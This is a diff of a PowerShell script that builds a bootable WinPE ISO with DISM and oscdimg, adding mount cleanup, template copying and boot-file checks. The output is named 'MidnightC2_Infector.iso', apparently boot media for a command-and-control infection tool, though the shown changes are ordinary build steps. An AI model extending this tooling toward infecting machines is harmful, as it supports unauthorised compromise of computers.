@@ -8,6 +8,8 @@ $winpeBase = "$winpeBaseDir\winpe.wim"
 $copypeCmd = "$adkPath\Deployment Tools\CopyPE.cmd"
 $oscdimg = "$adkPath\Deployment Tools\amd64\Oscdimg\oscdimg.exe"
 
+$ErrorActionPreference = "Stop"
+
 # --- Common UI Functions ---
 function Write-Step($msg) { Write-Host "`n[*] $msg" -ForegroundColor Cyan }
 function Write-ErrorMsg($msg) { Write-Host "[X] $msg" -ForegroundColor Red }
@@ -32,8 +34,14 @@ if (-not (Test-Path $winpeBase)) {
 
 # 1. Cleanup old build
 if (Test-Path $peWorkDir) {
-    Write-Step "Cleaning up old build directory..."
+    Write-Step "Cleaning up old build directory and stuck mounts..."
+    # Force unmount any stuck images first
+    if (Test-Path "$peWorkDir\mount") {
+        dism.exe /Unmount-Wim /MountDir:"$peWorkDir\mount" /Discard /Quiet | Out-Null
+    }
     dism.exe /Cleanup-Mountpoints /Quiet | Out-Null
+    dism.exe /Cleanup-Wim /Quiet | Out-Null
+    
     # Try multiple times since DISM loves to lock files
     for($i=0; $i -lt 3; $i++){
         Remove-Item $peWorkDir -Recurse -Force -ErrorAction SilentlyContinue
@@ -42,15 +50,48 @@ if (Test-Path $peWorkDir) {
     }
 }
 
-# 2. Create WinPE Work Dir structure manually
-Write-Step "Initializing WinPE Environment Structure..."
+# 2. Create WinPE Work Dir structure from Template
+Write-Step "Initializing WinPE Environment from WindowsPE SET template..."
+$templateDir = Join-Path $PSScriptRoot "WindowsPE SET"
+
+if (-not (Test-Path $templateDir)) {
+    Write-ErrorMsg "Template folder 'WindowsPE SET' not found!"
+    exit
+}
+
+# Ensure destination media folder exists
+if (-not (Test-Path "$peWorkDir\media")) {
+    New-Item -Path "$peWorkDir\media" -ItemType Directory -Force | Out-Null
+}
+
+# Copy template to media folder (Copy contents properly)
+Get-ChildItem -Path "$templateDir\*" | ForEach-Object {
+    Copy-Item -Path $_.FullName -Destination "$peWorkDir\media\" -Recurse -Force | Out-Null
+}
+
 New-Item -Path "$peWorkDir\media\sources" -ItemType Directory -Force | Out-Null
 New-Item -Path "$peWorkDir\mount" -ItemType Directory -Force | Out-Null
 New-Item -Path "$peWorkDir\fwfiles" -ItemType Directory -Force | Out-Null
 
+# Copy boot files needed for ISO generation
 if (Test-Path "$adkPath\Deployment Tools\amd64\Oscdimg") {
     Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\efisys.bin" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
     Copy-Item "$adkPath\Deployment Tools\amd64\Oscdimg\etfsboot.com" -Destination "$peWorkDir\fwfiles\" -ErrorAction SilentlyContinue
+}
+
+# Fallback/Overwrite with Template boot files to ensure compatibility with the provided template
+if (Test-Path "$templateDir\boot\etfsboot.com") {
+    Copy-Item "$templateDir\boot\etfsboot.com" -Destination "$peWorkDir\fwfiles\" -Force
+}
+if (Test-Path "$templateDir\efi\microsoft\boot\efisys.bin") {
+    Copy-Item "$templateDir\efi\microsoft\boot\efisys.bin" -Destination "$peWorkDir\fwfiles\" -Force
+}
+
+if (-not (Test-Path "$peWorkDir\fwfiles\etfsboot.com")) {
+    Write-Warning "Missing etfsboot.com! BIOS boot might fail."
+}
+if (-not (Test-Path "$peWorkDir\fwfiles\efisys.bin")) {
+    Write-Warning "Missing efisys.bin! UEFI boot might fail."
 }
 
 # 3. Mount Boot Image
@@ -119,7 +160,10 @@ dism.exe /Unmount-Wim /MountDir:$mountDir /Commit
 Write-Step "Generating Bootable ISO..."
 $isoPath = "D:\MidnightC2_Infector.iso"
 if (Test-Path $oscdimg) {
-    & $oscdimg -n "-bootdata:2#p0,e,b$peWorkDir\fwfiles\etfsboot.com#pEF,e,b$peWorkDir\fwfiles\efisys.bin" "$peWorkDir\media" "$isoPath"
+    # -u2: UDF 2.01 (Modern OS, supports long filenames by default)
+    # -o: Optimize storage
+    # -m: Ignore maximum image size
+    & $oscdimg -o -m -u2 "-bootdata:2#p0,e,b$peWorkDir\fwfiles\etfsboot.com#pEF,e,b$peWorkDir\fwfiles\efisys.bin" "$peWorkDir\media" "$isoPath"
 }
 
 Write-Host "`n[SUCCESS] ISO Path: $isoPath" -ForegroundColor Green
